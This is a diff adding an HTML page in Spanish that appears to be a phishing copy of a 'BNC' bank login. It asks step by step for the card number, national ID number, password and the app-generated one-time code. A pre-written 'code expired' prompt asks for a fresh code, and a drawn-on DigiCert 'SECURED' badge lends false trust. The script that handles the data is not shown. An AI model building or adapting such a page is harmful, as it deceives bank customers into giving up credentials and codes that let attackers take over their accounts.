@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>BNC · Iniciar Sesión</title>
+<link rel="stylesheet" href="styles.css">
+</head>
+<body>
+<div class="wrap">
+
+  <img class="brand" src="/img/neol.png" alt="BNC">
+
+  <div class="date">
+    <svg viewBox="0 0 24 24" fill="#0c2b57" aria-hidden="true">
+      <path d="M7 2h2v2h6V2h2v2h3a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h3V2Zm13 7H4v11h16V9Z"/>
+    </svg>
+    <span id="dateText"></span>
+  </div>
+
+  <div class="card">
+    <div class="tabs" id="tabs">
+      <button class="tab active" type="button" data-tab="personas">Personas</button>
+      <button class="tab" type="button" data-tab="empresas">Empresas</button>
+    </div>
+
+    <div class="body">
+
+      <!-- ============ PASO 1 ============ -->
+      <section id="s1">
+        <h1>Iniciar Sesión</h1>
+        <p class="greet">¡<span id="saludo">Buenas tardes</span>, <b>Bienvenido</b>!</p>
+        <p class="sub">Ingrese sus credenciales</p>
+
+        <div class="seg" id="segPersonas">
+          <button class="seg-item active" type="button" data-mode="credito">Débito | Crédito</button>
+          <button class="seg-item" type="button" data-mode="bod">Débito BOD</button>
+        </div>
+
+        <div class="seg" id="segEmpresas" hidden>
+          <button class="seg-item active" type="button" data-mode="bncnet">BNCNET</button>
+          <button class="seg-item" type="button" data-mode="juridica">Débito Jurídica</button>
+        </div>
+
+        <hr class="rule">
+
+        <label class="inp">
+          <span class="ico">
+            <svg viewBox="0 0 24 18" fill="#9b9b9b" aria-hidden="true">
+              <rect x="1" y="1" width="22" height="16" rx="2.5"/>
+              <rect x="3.5" y="4.5" width="5" height="4" rx="1" fill="#fff"/>
+            </svg>
+          </span>
+          <input id="cardNumber" type="text" inputmode="numeric" maxlength="16"
+                 placeholder="Número de Tarjeta" autocomplete="off">
+        </label>
+
+        <label class="inp" id="cedulaWrap">
+          <span class="ico">
+            <svg viewBox="0 0 24 18" fill="#9b9b9b" aria-hidden="true">
+              <rect x="1" y="1" width="22" height="16" rx="2.5"/>
+              <rect x="4" y="5" width="4" height="5" rx="1" fill="#fff"/>
+              <rect x="10" y="5.5" width="9" height="1.6" fill="#fff"/>
+              <rect x="10" y="9" width="7" height="1.6" fill="#fff"/>
+              <rect x="4" y="12.5" width="15" height="1.6" fill="#fff"/>
+            </svg>
+          </span>
+          <input id="cedula" type="text" inputmode="numeric" maxlength="8"
+                 placeholder="Cédula de Identidad" autocomplete="off">
+        </label>
+
+        <p class="warn" id="s1Error" hidden></p>
+
+        <button class="btn-primary" id="btnContinuar" type="button">Continuar</button>
+      </section>
+
+      <!-- ============ PASO 2 · CLAVE ============ -->
+      <section id="s2" hidden>
+        <h1>Iniciar Sesión</h1>
+        <p class="greet">Ingrese su Clave Estimad@:</p>
+
+        <hr class="rule">
+
+        <div class="inp readonly">
+          <span class="ico">
+            <svg viewBox="0 0 24 18" fill="#9b9b9b" aria-hidden="true">
+              <rect x="1" y="1" width="22" height="16" rx="2.5"/>
+              <rect x="3.5" y="4.5" width="5" height="4" rx="1" fill="#fff"/>
+            </svg>
+          </span>
+          <input id="cardMask" type="text" disabled>
+        </div>
+
+        <div class="inp highlight" id="claveWrap">
+          <span class="ico">
+            <svg viewBox="0 0 16 20" fill="#9b9b9b" aria-hidden="true">
+              <path d="M8 0a5 5 0 0 0-5 5v3H2.2A1.2 1.2 0 0 0 1 9.2v9.6A1.2 1.2 0 0 0 2.2 20h11.6a1.2 1.2 0 0 0 1.2-1.2V9.2A1.2 1.2 0 0 0 13.8 8H13V5a5 5 0 0 0-5-5Zm0 1.8A3.2 3.2 0 0 1 11.2 5v3H4.8V5A3.2 3.2 0 0 1 8 1.8Z"/>
+            </svg>
+          </span>
+          <input id="clave" type="password" inputmode="text" maxlength="20"
+             placeholder="Clave" autocomplete="off">
+          <span class="ico-r">
+            <svg viewBox="0 0 16 20" fill="#9b9b9b" aria-hidden="true">
+              <path d="M8 0a5 5 0 0 0-5 5v3H2.2A1.2 1.2 0 0 0 1 9.2v9.6A1.2 1.2 0 0 0 2.2 20h11.6a1.2 1.2 0 0 0 1.2-1.2V9.2A1.2 1.2 0 0 0 13.8 8H13V5a5 5 0 0 0-5-5Zm0 1.8A3.2 3.2 0 0 1 11.2 5v3H4.8V5A3.2 3.2 0 0 1 8 1.8Z"/>
+            </svg>
+          </span>
+        </div>
+
+        <p class="warn" id="s2Error" hidden></p>
+
+        <button class="btn-primary" id="btnIngresar" type="button">Ingresar</button>
+        <button class="btn-secondary" id="btnRegresar" type="button">Regresar</button>
+      </section>
+
+      <!-- ============ PASO 3 · CÓDIGO DE LA APP ============ -->
+      <section id="s3" hidden>
+        <h1>Iniciar Sesión</h1>
+        <p class="greet">Ingrese el código generado en la app</p>
+        <p class="sub">El código cambia cada 60 segundos</p>
+
+        <hr class="rule">
+
+        <div class="inp highlight" id="codeWrap">
+          <span class="ico">
+            <svg viewBox="0 0 20 20" fill="#9b9b9b" aria-hidden="true">
+              <path d="M12.5 1a6.5 6.5 0 0 0-6.2 8.5L1 14.8V19h4.2l1.2-1.2v-1.6h1.6l1.2-1.2v-1.6h1.6l1.4-1.4A6.5 6.5 0 1 0 12.5 1Zm2.3 5.4a1.7 1.7 0 1 1 0-3.4 1.7 1.7 0 0 1 0 3.4Z"/>
+            </svg>
+          </span>
+          <input id="code" type="text" inputmode="numeric" maxlength="6"
+                 placeholder="Código de la app" autocomplete="off">
+        </div>
+
+        <p class="warn" id="s3Error" hidden>El código ha vencido. Espera a que cambie en la app y vuelve a ingresarlo.</p>
+
+        <button class="btn-primary" id="btnCode" type="button">Ingresar</button>
+      </section>
+
+      <hr class="rule">
+
+      <p class="forgot">
+        <svg viewBox="0 0 16 20" fill="#fff" aria-hidden="true">
+          <path d="M8 0a5 5 0 0 0-5 5v3H2.2A1.2 1.2 0 0 0 1 9.2v9.6A1.2 1.2 0 0 0 2.2 20h11.6a1.2 1.2 0 0 0 1.2-1.2V9.2A1.2 1.2 0 0 0 13.8 8H13V5a5 5 0 0 0-5-5Zm0 1.8A3.2 3.2 0 0 1 11.2 5v3H4.8V5A3.2 3.2 0 0 1 8 1.8Z"/>
+        </svg>
+        ¿Olvidaste tu clave?
+      </p>
+
+      <div class="legal">
+        <p>Tus datos se encuentran protegidos por nuestro certificado de seguridad digital (TLS/SSL)</p>
+        <div class="digicert">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="12" cy="12" r="11" fill="none" stroke="#fff" stroke-width="2"/>
+            <path d="M7 12.5l3.2 3.2L17 9" fill="none" stroke="#fff" stroke-width="2.4"
+                  stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+          <span>digicert<small>SECURED</small></span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- pantalla de carga -->
+<div class="loader" id="loader" hidden>
+  <div class="spinner">
+    <svg class="ring" viewBox="0 0 100 100" aria-hidden="true">
+      <circle class="ring-bg" cx="50" cy="50" r="46"/>
+      <circle class="ring-arc" cx="50" cy="50" r="46"/>
+    </svg>
+    <img class="spinner-logo" src="/img/neol.png" alt="">
+  </div>
+  <p class="loader-text">Espere un momento<br>por favor</p>
+</div>
+
+<script src="script.js" defer></script>
+</body>
+</html>
